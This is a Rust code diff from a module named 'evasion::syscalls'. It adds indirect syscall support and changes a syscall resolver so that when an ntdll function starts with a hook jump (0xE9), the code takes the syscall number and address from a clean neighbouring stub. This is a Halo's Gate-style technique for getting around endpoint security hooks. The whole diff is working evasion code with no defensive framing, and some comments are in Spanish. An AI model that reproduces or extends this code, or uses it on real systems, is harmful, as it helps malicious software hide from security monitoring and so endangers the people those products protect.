@@ -8,6 +8,7 @@ use windows::Win32::Foundation::HMODULE;
 use windows::Win32::System::Threading::PEB;
 use windows::Win32::System::WindowsProgramming::LDR_DATA_TABLE_ENTRY;
 use crate::evasion::syscalls::direct::set_ssn;
+use crate::evasion::syscalls::indirect::set_gate;
 
 const UP: isize = -32;
 const DOWN: isize = 32;
@@ -59,6 +60,27 @@ pub unsafe fn prepare_direct_syscall(hash: u32) {
         },
         Err(e) => {
             panic!("[prepare_direct_syscall] Error: {}", e);
+        }
+    }
+}
+
+/// Prepares a system call by fetching the NT syscall using the provided hash.
+///
+/// # Parameters
+///
+/// - `hash`: A 32-bit unsigned integer representing the hash value used to fetch the NT syscall.
+///
+/// # Panics
+///
+/// This function will panic if there is an error in fetching the NT syscall.
+/// The error message will be printed with the hash value.
+pub unsafe fn prepare_indirect_syscall(hash: u32) {
+    match fetch_nt_syscall(hash) {
+        Ok(syscall) => {
+            set_gate(syscall.p_syscall_address);
+        },
+        Err(e) => {
+            panic!("[prepare_indirect_syscall] Error: {}", e);
         }
     }
 }
@@ -181,20 +203,21 @@ pub unsafe fn fetch_nt_syscall(dw_sys_hash: u32) -> Result<NtSyscall, &'static s
 
             // if hooked - scenario 1
             if *func_address == 0xE9 {
-                if let Some(ssn) = find_syscall_number(func_address) {
-                    nt_sys.dw_ssn = ssn;
-                    let mut cache = SYSCALL_CACHE.lock().unwrap();
-                    cache.push(nt_sys.clone());
+                if let Some((ssn, clean_stub)) = find_syscall_number(func_address) {
+                    nt_sys.dw_ssn           = ssn;
+                    nt_sys.p_syscall_address = clean_stub as *mut c_void;   // <── stub limpio
+                    SYSCALL_CACHE.lock().unwrap().push(nt_sys.clone());
                     return Ok(nt_sys);
                 }
             }
 
+
             // if hooked - scenario 2
             if *func_address.add(3) == 0xE9 {
-                if let Some(ssn) = find_syscall_number(func_address) {
-                    nt_sys.dw_ssn = ssn;
-                    let mut cache = SYSCALL_CACHE.lock().unwrap();
-                    cache.push(nt_sys.clone());
+                if let Some((ssn, clean_stub)) = find_syscall_number(func_address) {
+                    nt_sys.dw_ssn           = ssn;
+                    nt_sys.p_syscall_address = clean_stub as *mut c_void;   // <── stub limpio
+                    SYSCALL_CACHE.lock().unwrap().push(nt_sys.clone());
                     return Ok(nt_sys);
                 }
             }
@@ -211,13 +234,20 @@ pub unsafe fn fetch_nt_syscall(dw_sys_hash: u32) -> Result<NtSyscall, &'static s
 ///
 /// # Returns
 /// * `Some(u32)` containing the syscall number if found, `None` otherwise.
-unsafe fn find_syscall_number(func_address: *const u8) -> Option<u32> {
+unsafe fn find_syscall_number(func_address: *const u8) -> Option<(u32, *const u8)>      // <── ahora devuelve tupla
+{
+
     for idx in 1..=RANGE {
-        if check_syscall_bytes(func_address, idx as isize * DOWN) {
-            return Some((extract_syscall_number(func_address, idx as isize * DOWN) - idx) as u32);
+        let down = idx as isize * DOWN;
+        let up   = idx as isize * UP;
+
+        if check_syscall_bytes(func_address, down) {
+            let ssn = extract_syscall_number(func_address, down) as u32 - idx as u32;
+            return Some((ssn, func_address.offset(down)));   // stub limpio
         }
-        if check_syscall_bytes(func_address, idx as isize * UP) {
-            return Some((extract_syscall_number(func_address, idx as isize * UP) + idx) as u32);
+        if check_syscall_bytes(func_address, up) {
+            let ssn = extract_syscall_number(func_address, up) as u32 + idx as u32;
+            return Some((ssn, func_address.offset(up)));     // stub limpio
         }
     }
     None
